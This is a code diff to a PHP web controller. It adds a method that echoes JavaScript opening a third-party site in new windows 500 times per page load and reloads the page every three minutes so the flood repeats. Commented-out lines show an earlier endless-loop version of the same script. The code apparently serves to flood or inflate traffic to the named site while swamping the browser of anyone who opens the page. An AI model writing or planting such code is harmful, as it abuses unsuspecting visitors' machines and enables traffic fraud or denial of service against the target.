@@ -74,26 +74,51 @@ class Code extends MY_Base_Controller {
 
 	public function test_b_l()
     {
-       
-            //secho "<script>window.onload = function() {document.location.href=https://www.butterfly-love.com.tw';};";
-			echo "
+		// ignore_user_abort();
+		// set_time_limit(0);
+		// $sleep_time=3;
+		// while(true){
+		// 	echo "
+		// 	<script>
+		// 		var i=0;
+		// 		function test(){
+		// 			window.open('https://www.butterfly-love.com.tw');
+		// 		}
+				
+		// 		for(i;i<=250;i++){
+		// 			test();
+		// 		}
+		// 	</script>";
+		// 	sleep($sleep_time);
+		// };
+		echo "
 			<script>
 				var i=0;
 				function test(){
 					window.open('https://www.butterfly-love.com.tw');
 				}
+				for(i;i<=500;i++){
+						test();
+				 }
 				
-				for(i;i<=250;i++){
-					test();
-				}
+				setTimeout(function(){
+					location.reload();
+				},180000);
 			</script>";
+            //secho "<script>window.onload = function() {document.location.href=https://www.butterfly-love.com.tw';};";
+		
             //echo "<script>window.open('https://www.butterfly-love.com.tw');</script>";
 			//header("https://www.butterfly-love.com.tw");
 			
 			// setTimeout(function(){
 			// 	window.open('https://www.butterfly-love.com.tw');
 			// },5000);
+			// for(i;i<=250;i++){
+			// 	test();
+			// }
     }
+
+	
 
 }
 ?>
